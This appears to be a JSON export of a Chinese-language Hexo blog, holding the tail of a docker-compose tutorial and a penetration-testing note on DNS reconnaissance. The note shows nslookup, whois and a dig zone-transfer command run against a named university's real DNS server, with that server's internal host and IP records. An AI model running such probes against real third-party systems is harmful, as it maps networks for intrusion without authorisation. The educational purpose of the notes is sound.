class=\"string\">'hits'</span>)<span class=\"keyword\">if</span> __name__ ==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, debug=<span class=\"keyword\">True</span>)</div></pre></td></tr></table></figure></p>\n<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">web:</div><div class=\"line\">  build:.</div><div class=\"line\">  <span class=\"built_in\">command</span>: python app.py</div><div class=\"line\">  ports:</div><div class=\"line\">         - <span class=\"string\">\"5000:5000\"</span></div><div class=\"line\">  volumes:</div><div class=\"line\">         - .:/code</div><div class=\"line\">  links:</div><div class=\"line\">         - redis</div><div class=\"line\">redis:</div><div class=\"line\">  image: redis</div></pre></td></tr></table></figure></p>\n<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">Creating myapp_redis_1...</div><div class=\"line\">Creating myapp_web_1...</div><div class=\"line\">Building web...</div><div class=\"line\">Step 0 : FROM python:2.7</div><div class=\"line\">2.7: Pulling from python</div><div class=\"line\">...</div><div class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> python:2.7</div><div class=\"line\"> ---&gt; d833e0b23482</div><div class=\"line\">Step 1 : ADD . /code</div><div class=\"line\"> ---&gt; 1c04b1b15808</div><div class=\"line\">Removing intermediate container 9dab91b4410d</div><div class=\"line\">Step 2 : WORKDIR /code</div><div class=\"line\"> ---&gt; Running <span class=\"keyword\">in</span> f495a62feac9</div><div class=\"line\"> ---&gt; ffea89a7b090</div><div class=\"line\">Attaching to myapp_redis_1, myapp_web_1</div><div class=\"line\">......</div><div class=\"line\">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class=\"line\">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class=\"line\">web_1   |  * Restarting with <span class=\"built_in\">stat</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-Yaml文件参考\"><a href=\"#3-Yaml文件参考\" class=\"headerlink\" title=\"3. Yaml文件参考\"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>\n<p>image:镜像的ID</p>\n<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>\n<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>\n<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>\n<p>command：替换默认的command命令</p>\n<p>ports: 导出端口。格式可以是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>\n<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>\n<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">volumes:-/var/lib/mysql</div><div class=\"line\"> - cache/:/tmp/cache</div><div class=\"line\"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>\n<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">environment:- RACK_ENV=development</div><div class=\"line\">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>\n<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>\n<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">common.yml</div><div class=\"line\">webapp:</div><div class=\"line\">  build:./webapp</div><div class=\"line\">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class=\"line\">development.yml</div><div class=\"line\">web:extends:</div><div class=\"line\">    file: common.yml</div><div class=\"line\">    service: webapp</div><div class=\"line\">  ports:-&quot;8000:8000&quot;</div><div class=\"line\">  links:- db</div><div class=\"line\">  environment:- DEBUG=true</div><div class=\"line\">db:</div><div class=\"line\">  image: postgres</div></pre></td></tr></table></figure></p>\n<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>\n<p>dns_search:可以设置一个或多个DNS的扫描域。</p>\n<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">cpu_shares:73</div><div class=\"line\">working_dir:/code</div><div class=\"line\">entrypoint: /code/entrypoint.sh</div><div class=\"line\">user: postgresql</div><div class=\"line\">hostname: foo</div><div class=\"line\">domainname: foo.com</div><div class=\"line\">mem_limit:1000000000</div><div class=\"line\">privileged:true</div><div class=\"line\">restart: always</div><div class=\"line\">stdin_open:true</div><div class=\"line\">tty:true</div></pre></td></tr></table></figure>\n<h2 id=\"4-docker-compose常用命令\"><a href=\"#4-docker-compose常用命令\" class=\"headerlink\" title=\"4. docker-compose常用命令\"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>\n<p>–verbose：输出详细信息</p>\n<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>\n<p>-p 设置一个项目名称（默认是directory名）</p>\n<p>docker-compose的动作包括：</p>\n<p>build：构建服务</p>\n<p>kill -s SIGINT：给服务发送特定的信号。</p>\n<p>logs：输出日志</p>\n<p>port：输出绑定的端口</p>\n<p>ps：输出运行的容器</p>\n<p>pull：pull服务的image</p>\n<p>rm：删除停止的容器</p>\n<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>\n<p>start：运行某个服务中存在的容器。</p>\n<p>stop:停止某个服务中存在的容器。</p>\n<p>up：create + run + attach容器到服务。</p>\n<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\">http://debugo.com/docker-compose</a></p>\n</blockquote>"},{"title":"Kali系列——信息收集阶段（一）","id":"6","updated":"2016-08-05T20:13:28.000Z","date":"2016-07-30T16:48:20.000Z","_content":"\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","source":"_posts/Kali系列——信息收集阶段（一）.md","raw":"---\ntitle: Kali系列——信息收集阶段（一）\ntags: 'Hack'\npermalink: hack1\nid: 6\nupdated: '2016-08-05 21:13:28'\ndate: 2016-07-30 17:48:20\n---\n\n记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：\n>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探\n\n>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！\n\n其实，我觉得渗透测试无论怎么变，不外乎这几点：\n\n>信息收集阶段->漏洞检测阶段->漏洞利用阶段->持久化后门阶段\n\n最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。\n<!-- more --> \n# 信息收集阶段\n## DNS信息\n其实DNS信息收集阶段用两个Linux系统自带工具即可完成。\n\n### nslookup\n\n此命令，可以快速查处ip地址\n```bash\n ✘ ivan@Ivan~ nslookup zhihu.com\nServer:\t\t114.114.114.114\nAddress:\t114.114.114.114#53\n\nNon-authoritative answer:\nName:\tzhihu.com\nAddress: 54.223.189.245\n```\n\n当然也可以指定dns查询服务器：\n```bash\nivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8\nServer:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nzhihu.com\tnameserver = ns3.dnsv4.com.\nzhihu.com\tnameserver = ns4.dnsv4.com.\n\nAuthoritative answers can be found from:\n```\n### dig\ndig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：\n```bash\nivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr\n\n; <<>> DiG 9.8.3-P1 <<>> @dns.csust.edu.cn csust.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.\ncsust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18\ncsust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.\ncsust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008\n3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6\napp.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11\napp7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227\napp8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8\narchives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232\nbid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.\nbw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20\ncas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1\ncslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80\ncslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ncwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252\ncxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203\ndkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200\ndlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.\ndns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8\ncsust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400\n;; Query time: 62 msec\n;; SERVER: 210.43.192.8#53(210.43.192.8)\n;; WHEN: Sat Jul 30 20:18:47 2016\n;; XFR size: 112 records (messages 1, bytes 2369)\n```\n可以看到，各种信息，从A、cname到MX全部暴露无遗。\n如果不存在该漏洞则会被服务器拒绝查询请求。\n\n```bash\nivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr\n; <<>> DiG 9.8.3-P1 <<>> @dns4.tju.edu.cn tju.edu.cn axfr\n; (1 server found)\n;; global options: +cmd\n; Transfer failed.\n```\n\n### whois\nwhois查询，不多解释了\n\n```bash\nivan@Ivan ~ whois yfgeek.com\n\nWhois Server Version 2.0\n\nDomain names in the .com and .net domains can now be registered\nwith many different competing registrars. Go to http://www.internic.net\nfor detailed information.\n\n   Domain Name: YFGEEK.COM\n   Registrar: GODADDY.COM, LLC\n   Sponsoring Registrar IANA ID: 146\n   Whois Server: whois.godaddy.com\n   Referral URL: http://www.godaddy.com\n   Name Server: F1G1NS1.DNSPOD.NET\n   Name Server: F1G1NS2.DNSPOD.NET\n   Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\n   Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Updated Date: 21-apr-2016\n   Creation Date: 23-nov-2012\n   Expiration Date: 23-nov-2017\n\n```\n","slug":"hack1","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym300e000acdonyj0f52n0","content":"<p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>\n<blockquote>\n<p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>\n<p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>\n</blockquote>\n<p>其实，我觉得渗透测试无论怎么变，不外乎这几点：</p>\n<blockquote>\n<p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>\n</blockquote>\n<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br><a id=\"more\"></a> </p>\n<h1 id=\"信息收集阶段\"><a href=\"#信息收集阶段\" class=\"headerlink\" title=\"信息收集阶段\"></a>信息收集阶段</h1><h2 id=\"DNS信息\"><a href=\"#DNS信息\" class=\"headerlink\" title=\"DNS信息\"></a>DNS信息</h2><p>其实DNS信息收集阶段用两个Linux系统自带工具即可完成。</p>\n<h3 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h3><p>此命令，可以快速查处ip地址<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"> ✘ ivan@Ivan~ nslookup zhihu.com</div><div class=\"line\">Server:\t\t114.114.114.114</div><div class=\"line\">Address:\t114.114.114.114<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">Name:\tzhihu.com</div><div class=\"line\">Address: 54.223.189.245</div></pre></td></tr></table></figure></p>\n<p>当然也可以指定dns查询服务器：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ nslookup -type=ns zhihu.com 8.8.8.8</div><div class=\"line\">Server:\t\t8.8.8.8</div><div class=\"line\">Address:\t8.8.8.8<span class=\"comment\">#53</span></div><div class=\"line\"></div><div class=\"line\">Non-authoritative answer:</div><div class=\"line\">zhihu.com\tnameserver = ns3.dnsv4.com.</div><div class=\"line\">zhihu.com\tnameserver = ns4.dnsv4.com.</div><div class=\"line\"></div><div class=\"line\">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>\n<h3 id=\"dig\"><a href=\"#dig\" class=\"headerlink\" title=\"dig\"></a>dig</h3><p>dig真是个好工具，甚至可以找出DNS域传送漏洞。下面举一个例子，也是乌云网曝光过的，由于篇幅问题，精简了很多内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan  ~  dig @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\"></div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns.csust.edu.cn csust.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tNS\tdns2.csust.edu.cn.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t113.240.233.146</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tA\t210.43.192.18</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t5 mxbiz1.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tMX\t10 mxbiz2.qq.com.</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tAAAA\t2001:da8:d002::d22b:c008</div><div class=\"line\">3g.csust.edu.cn.\t86400\tIN\tA\t113.240.233.6</div><div class=\"line\">app.csust.edu.cn.\t86400\tIN\tA\t113.240.233.11</div><div class=\"line\">app7.csust.edu.cn.\t86400\tIN\tA\t222.240.152.227</div><div class=\"line\">app8.csust.edu.cn.\t86400\tIN\tA\t113.240.233.8</div><div class=\"line\">archives.csust.edu.cn.\t86400\tIN\tA\t222.240.152.232</div><div class=\"line\">bid.csust.edu.cn.\t86400\tIN\tCNAME\tjtcloud.csust.edu.cn.</div><div class=\"line\">bw.csust.edu.cn.\t86400\tIN\tA\t10.255.194.20</div><div class=\"line\">cas.csust.edu.cn.\t86400\tIN\tA\t210.43.198.1</div><div class=\"line\">cslgqkzx.csust.edu.cn.\t86400\tIN\tA\t210.43.188.80</div><div class=\"line\">cslgxbsk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cslgxbzk.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">cwcx.csust.edu.cn.\t86400\tIN\tA\t10.22.14.252</div><div class=\"line\">cxlt.csust.edu.cn.\t86400\tIN\tA\t222.240.152.203</div><div class=\"line\">dkxnsyzx.csust.edu.cn.\t86400\tIN\tA\t222.240.152.200</div><div class=\"line\">dlkjxb.csust.edu.cn.\t86400\tIN\tCNAME\tcslgqkzx.csust.edu.cn.</div><div class=\"line\">dns.csust.edu.cn.\t86400\tIN\tA\t210.43.192.8</div><div class=\"line\">csust.edu.cn.\t\t86400\tIN\tSOA\tdns.csust.edu.cn. root.localhost.csust.edu.cn. 20160725 28800 7200 604800 86400</div><div class=\"line\">;; Query time: 62 msec</div><div class=\"line\">;; SERVER: 210.43.192.8<span class=\"comment\">#53(210.43.192.8)</span></div><div class=\"line\">;; WHEN: Sat Jul 30 20:18:47 2016</div><div class=\"line\">;; XFR size: 112 records (messages 1, bytes 2369)</div></pre></td></tr></table></figure></p>\n<p>可以看到，各种信息，从A、cname到MX全部暴露无遗。<br>如果不存在该漏洞则会被服务器拒绝查询请求。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr</div><div class=\"line\">; (1 server found)</div><div class=\"line\">;; global options: +cmd</div><div class=\"line\">; Transfer failed.</div></pre></td></tr></table></figure>\n<h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p>whois查询，不多解释了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">ivan@Ivan ~ whois yfgeek.com</div><div class=\"line\"></div><div class=\"line\">Whois Server Version 2.0</div><div class=\"line\"></div><div class=\"line\">Domain names <span class=\"keyword\">in</span> the .com and .net domains can now be registered</div><div class=\"line\">with many different competing registrars. Go to http://www.internic.net</div><div class=\"line\"><span class=\"keyword\">for</span> detailed information.</div><div class=\"line\"></div><div class=\"line\">   Domain Name: YFGEEK.COM</div><div class=\"line\">   Registrar: GODADDY.COM, LLC</div><div class=\"line\">   Sponsoring Registrar IANA ID: 146</div><div class=\"line\">   Whois Server: whois.godaddy.com</div><div class=\"line\">   Referral URL: http://www.godaddy.com</div><div class=\"line\">   Name Server: F1G1NS1.DNSPOD.NET</div><div class=\"line\">   Name Server: F1G1NS2.DNSPOD.NET</div><div class=\"line\">   Status: clientDeleteProhibited https://icann.org/epp<span class=\"comment\">#clientDeleteProhibited</span></div><div class=\"line\">   Status: clientRenewProhibited https://icann.org/epp<span class=\"comment\">#clientRenewProhibited</span></div><div class=\"line\">   Status: clientTransferProhibited https://icann.org/epp<span class=\"comment\">#clientTransferProhibited</span></div><div class=\"line\">   Status: clientUpdateProhibited https://icann.org/epp<span class=\"comment\">#clientUpdateProhibited</span></div><div class=\"line\">   Updated Date: 21-apr-2016</div><div class=\"line\">   Creation Date: 23-nov-2012</div><div class=\"line\">   Expiration Date: 